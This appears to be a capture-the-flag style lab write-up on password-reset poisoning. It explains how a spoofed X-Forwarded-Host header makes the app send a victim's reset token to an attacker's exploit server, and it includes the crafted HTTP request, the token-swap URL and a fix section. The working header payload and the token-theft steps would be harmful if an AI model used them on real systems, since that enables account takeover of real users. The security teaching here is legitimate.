The reset email is built from the hostname the app thinks it is running on, and a middleware layer in front happily accepts a header that overrides it. So the "reset your password" mail that lands in Carlos's inbox points at my server, with his token attached.

## The setup

The forgot-password form takes a username and, for a real account, emails a link like `https://LAB/forgot-password?temp-forgot-password-token=<random>`. That link is assembled from the incoming request, not from a fixed config value. Carlos will click anything that reaches his inbox. You have `wiener:peter` and an exploit server whose access log you can read.

## How the vulnerability works

In front of the app sits a reverse proxy or middleware that reads `X-Forwarded-Host` and rewrites the effective host for the backend. That header exists so a proxy can tell the app the real public hostname. Here nothing checks who is allowed to set it.

So when the code builds the reset URL, it uses a hostname I put in the request header. The token is still valid and still belongs to Carlos, only the domain in front of it changed. The email goes out, Carlos clicks, and his browser fetches the link from my server. My access log now holds his token.

To finish, I do not need Carlos's inbox. I need any real reset link, so I can take its token parameter and drop the stolen value in.

## Solving it

1. Log in as `wiener:peter`, use the forgot-password form, and read your own email so you know the link format.
2. Send the `POST /forgot-password` request to Repeater. Confirm the `X-Forwarded-Host` header is honoured.
3. Add the header pointing at your exploit server, and set the username to Carlos.

```http
POST /forgot-password HTTP/2
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
Content-Type: application/x-www-form-urlencoded

username=carlos
```

4. Open the exploit server access log. You get a `GET /forgot-password?temp-forgot-password-token=...` from Carlos. Copy the token.
5. Take the valid link from your own email and swap in Carlos's token.

```text
https://LAB/forgot-password?temp-forgot-password-token=STOLEN-TOKEN
```

6. Load it, set a new password for Carlos, then log in as Carlos.

## Why that payload works

The reset URL is assembled from request data, and the middleware treats `X-Forwarded-Host` as authoritative. Changing it moves only where the browser is sent, while the token stays bound to the account named in the body. Carlos's client follows the poisoned link, which leaks the token to the log, and the token, not the link, is the secret that grants the reset.

## The fix

Never build security-sensitive URLs from request headers. Generate reset links from a fixed, trusted base URL in config. If a proxy must forward the host, trust the header only from a known proxy and strip it from client requests. Bind each token to one use and a short expiry, and compare it in constant time.
